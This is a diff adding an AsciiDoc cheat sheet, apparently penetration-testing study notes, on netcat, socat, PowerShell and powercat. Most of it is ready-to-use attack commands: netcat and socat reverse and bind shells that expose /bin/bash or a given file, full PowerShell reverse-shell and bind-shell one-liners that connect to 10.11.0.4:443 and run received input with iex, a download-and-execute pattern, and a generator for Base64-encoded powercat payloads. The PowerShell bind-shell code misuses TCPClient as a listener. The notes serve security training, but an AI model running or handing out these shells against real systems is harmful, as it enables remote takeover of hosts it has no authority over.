@@ -1,0 +1,111 @@
+= Practical Tools
+
+== Netcat
+
+* `nc <IP> <PORT>`
+** `nc -n` skip DNS resolution
+** `nc -v` verbose
+** `nc -l` for creating listener
+** `nc -p` for creating the port
+
+=== Bind & Reverse shell 
+
+A reverse shell is a shell initiated from the target host back to the attack box which is in a listening state to pick up the shell. A bind shell is setup on the target host and binds to a specific port to listens for an incoming connection from the attack box.
+
+* `nc -nvlp <PORT> -e <file>` on target
+This is binding a local PORT's IO to the STDIN/STDOUT/STDERR of a file locally, to which any attack machine can connect to.
+
+* `nc -nv <IP> <PORT> -e <file>` on target
+* `nc -nvlp <PORT>` on attack machine
+This is a reverse shell.
+
+== SOCAT
+
+Socat creates two bidirectional byte streams and transfers data between them.
+
+* `socat - TCP4:<IP>:<PORT>`
+* `socat - TCP4-LISTEN:<PORT> STDOUT` creates a listener to the STDOUT of a port
+* `socat TCP4-LISTEN:<PORT>,fork file:<file>` creates a child process to send a file
+* `socat TCP4:<IP>:443 file:<file>,create` receives bytes and creates a file with them
+* `socat -d -d` for verbose
+* `socat TCP4:<IP>:<PORT> EXEC:/bin/bash` for reverse shell
+* `socat -` the hyphen represents the STDIO
+
+=== Encrypted bind shells
+
+* `openssl req -newkey rsa:2048 -nodes -keyout <keyfile.key> -x509 -days 365 -out <file.crt>` to create a new self-signed certificate with a new private key outputted to keyfile
+* `cat <keyfile.key> <file.crt> > <pemfile>`
+* `socat OPENSSL-LISTEN:443,cert=<pemfile>,verify=0,fork EXEC:/bin/bash` creates a listener with a certificate, disable verification and spawns a child to send an
+* `socat - OPENSSL:<IP>:<PORT>,verify=0`
+
+== Powershell
+
+* `Set-ExecutionPolicy Unrestricted` changes execution policy
+* `powershell -c "(new-object System.Net.WebClient).DownloadFile('<URL>', '<absolute-path>')"` downloads a file
+* `iex $data` executes the command passed to it
+
+=== Reverse shell
+
+Use the following command as a powershell oneliner to send a reverse shell
+
+```
+$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+$sendback = (iex $data 2>&1 | Out-String );
+$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+$stream.Write($sendbyte,0,$sendbyte.Length);
+$stream.Flush();
+}
+$client.Close();
+```
+
+Oneliner here:
+`$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();`
+
+=== Bind shell
+
+```
+$listener = New-Object System.Net.Sockets.TCPClient('0.0.0.0',443);
+listener.start();$client = $listener.AcceptTcpClient();
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}
+$client.Close();
+$listener.Stop();
+```
+
+In one line
+`$listener = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()`
+
+== Powercat
+
+* In Kali, `apt install powercat` installs the script in `/usr/share/windows-resources/powercat`
+* `. ./powercat.ps1` to source the script
+* `powercat -c <IP> -p <PORT> -i <file>` to transfer file to remote
+
+=== Reverse shell
+
+* `powercat -c <IP> -p 443 -e cmd.exe` to execute cmd when connected, e.g. reverse shell
+
+=== Bind shell
+
+* `powercat -l` to create listener
+* `powercat -l -p <PORT> -e cmd.exe` creates a listener that an attacker can connect to
+
+=== Powercat payloads
+
+* `powercat -c <IP> -p <PORT> -e cmd.exe -ge > encodedreverseshell.ps1` creates a Base64 encoded payload that powercat can execute
+*
